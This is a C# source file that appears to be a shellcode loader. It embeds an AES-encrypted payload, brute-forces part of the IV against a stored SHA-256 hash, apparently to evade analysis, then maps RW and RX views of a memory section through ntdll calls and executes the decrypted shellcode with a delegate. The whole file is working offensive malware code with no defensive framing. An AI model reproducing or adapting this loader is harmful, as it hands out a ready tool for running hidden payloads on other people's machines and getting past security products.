
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
namespace ze
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SECT_DATA
        {
            public Boolean isvalid;
            public IntPtr hSection;
            public IntPtr pBase;
        }
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);
        public static SECT_DATA MapLocalSectionAndWrite(byte[] ShellCode)
        {
            SECT_DATA SectData = new SECT_DATA();
            long ScSize = ShellCode.Length;
            long MaxSize = ScSize;
            IntPtr hSection = IntPtr.Zero;
            UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
            if (CallResult == 0 && hSection != IntPtr.Zero)
            {
                SectData.hSection = hSection;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            IntPtr pScBase = IntPtr.Zero;
            long lSecOffset = 0;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x4);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                SectData.pBase = pScBase;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            Marshal.Copy(ShellCode, 0, SectData.pBase, ShellCode.Length);
            IntPtr pScBase2 = IntPtr.Zero;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase2, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x20);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                SectData.pBase = pScBase2;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            SectData.isvalid = true;
            return SectData;
        }

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        private delegate Int32 Initialize();
        public static byte[] DecryptAES(byte[] buffer, byte[] key, byte[] iv, byte[] OGhash, int origLen)
        {
            if (buffer == null || buffer.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (key == null || key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (iv == null || key.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] test = new byte[origLen];
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(buffer))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        csDecrypt.Read(test, 0, origLen);
                        HashAlgorithm sha = SHA256.Create();
                        byte[] result = sha.ComputeHash(test, 0, origLen);
                        bool bEqual = false;
                        if (result.Length == OGhash.Length)
                        {
                            int i = 0;
                            while ((i < result.Length) && (result[i] == OGhash[i]))
                            {
                                i += 1;
                            }
                            if (i == result.Length)
                            {
                                bEqual = true;
                            }
                        }
                        if (bEqual)
                            return test;
                        else
                            return null;
                    }
                }
            }
        }
        static void Runner(byte[] data)
        {
            byte[] key = { 0x4d,0x5,0x75,0x2,0xff,0x8e,0x35,0xf8,0x72,0x20,0x66,0x88,0xa0,0xf6,0x1f,0xda };
            byte[] iv = { 0x6d,0xda,0x84,0x63,0xb5,0x69,0x63,0xb4,0x7f,0x34,0x4a,0x2e,0x93,0x87,0xf0,0xd9 };
            
            byte[] OG_hash = {
               0x1a,0xbe,0x67,0xcb,0x87,0x87,0x2a,0xeb,0x99,0x24,0x15,0x3c,0xe6,0x8d,0xa8,0x6b,0x3c,0xba,0x27,0x6b,0x8d,0xc5,0xb9,0x2,0x90,0xe0,0x92,0xa7,0x36,0xf,0x5c,0x28
            };
            for (byte i = 0x01; i < 0xff; i++)
            {
                iv[14] = i;
                for (byte j = 1; j < 0xff; j++)
                {
                    iv[15] = j;
                    if (DecryptAES(data, key, iv, OG_hash, 299) != null) // OG len and encrypted len are different
                    {
                        Console.WriteLine("[*] Decryption Succeeded");
                        byte[] shellcode = DecryptAES(data, key, iv, OG_hash, 299);
                        // Create local section, map two views RW + RX, copy shellcode to RW
                        Console.WriteLine("\n[>] Creating local section..");
                        SECT_DATA LocalSect = MapLocalSectionAndWrite(shellcode);
                        if (!LocalSect.isvalid)
                        {
                            return;
                        }

                        Console.WriteLine("\n[>] Triggering shellcode using delegate!");
                        Initialize del = (Initialize)Marshal.GetDelegateForFunctionPointer(LocalSect.pBase, typeof(Initialize));
                        del();

                        return;
                    }
                    else
                    {
                        Console.WriteLine("[!] Decryption Failed");
                    }
                }
            }
        }
        public static void Main(string[] args)
        {
            byte[] buf = new byte[304] { 
                0x11,0x9d,0x7e,0x6c,0x7d,0xdb,0x8c,0x3a,0x32,0xb,0x1d,0xee,0x1a,0xa2,0xb1,0x1e,0x63,0x1b,0x37,0x63,0x7a,0xe7,0xa2,0xeb,0xc3,0x2b,0x22,0x31,0xe7,0x51,0x6f,0xe8,0x77,0x7e,0xcf,0x8d,0x4a,0xf1,0x75,0xfd,0xec,0xa7,0x89,0x60,0x9,0xf5,0xa7,0xdd,0xcb,0xfd,0x93,0x6e,0x5,0xf5,0x1d,0xcf,0xfa,0x2a,0xf1,0xae,0x18,0xa2,0xc1,0x9d,0xbd,0x1b,0x25,0x14,0xc6,0xe,0x2a,0xf1,0x20,0x97,0xf8,0xc9,0xb5,0x5b,0x97,0xb8,0x26,0x0,0xf6,0x8,0xe3,0xa9,0x0,0x6d,0x5,0xe7,0x49,0x3a,0xef,0xb4,0xfd,0x1b,0x76,0x5,0x1f,0x3a,0x11,0x73,0xa8,0x89,0x78,0x65,0x9e,0x89,0x97,0x4c,0xf1,0xf1,0xf6,0x5e,0xb4,0x9b,0xdc,0xe9,0xd0,0x5f,0x54,0x2f,0x87,0xd7,0x65,0xca,0xdf,0xb5,0x43,0x42,0xcb,0xaa,0x38,0xf5,0x18,0x9b,0xc0,0xa6,0xef,0x59,0x3d,0xa6,0xc2,0xfa,0xc7,0x69,0xdf,0x85,0xa6,0x1,0x96,0xa1,0x9b,0x82,0xae,0x92,0xdd,0x61,0xb5,0x38,0x7c,0x53,0xbe,0x80,0x63,0xe3,0x9c,0x44,0xc9,0xed,0xca,0xeb,0xf7,0x68,0x9c,0x31,0xa2,0x61,0x27,0xfd,0x72,0x9c,0x22,0xa2,0x1e,0x28,0x9e,0x8c,0xb3,0x11,0x57,0xf6,0x83,0xe2,0xc8,0xd4,0x13,0x7,0x61,0xa4,0x98,0x76,0x8a,0x12,0x2e,0xf4,0x2a,0xea,0x46,0x40,0xd5,0x4c,0xe8,0xb7,0xb1,0xe5,0xf2,0x77,0x1a,0x93,0xb,0x9c,0xc5,0xb1,0xb4,0x4,0x65,0xa8,0xb9,0x9a,0x4,0xfd,0xa0,0x59,0xfa,0x77,0xb4,0x4b,0x42,0xd5,0x3d,0xe2,0x7,0x5f,0x79,0x39,0xb7,0x56,0x95,0x0,0xb1,0xb2,0x54,0xb5,0x43,0x45,0x57,0x26,0x9b,0x2,0xbd,0x9e,0xdc,0x14,0x90,0x9a,0xc8,0xad,0xb1,0x22,0xfe,0x6f,0xd,0x5a,0x84,0x15,0x62,0xc3,0x24,0xb3,0xf1,0x43,0x8b,0x27,0x8,0x9,0x1d,0xdf,0x4f,0xd8,0x47,0x26,0x84,0xa6,0xe0,0x96,0xf8,0x8d,0x69,0xe7,0x2c,0x69,0xa,0xd4 
            };
            Runner(buf);
        }
    }
}
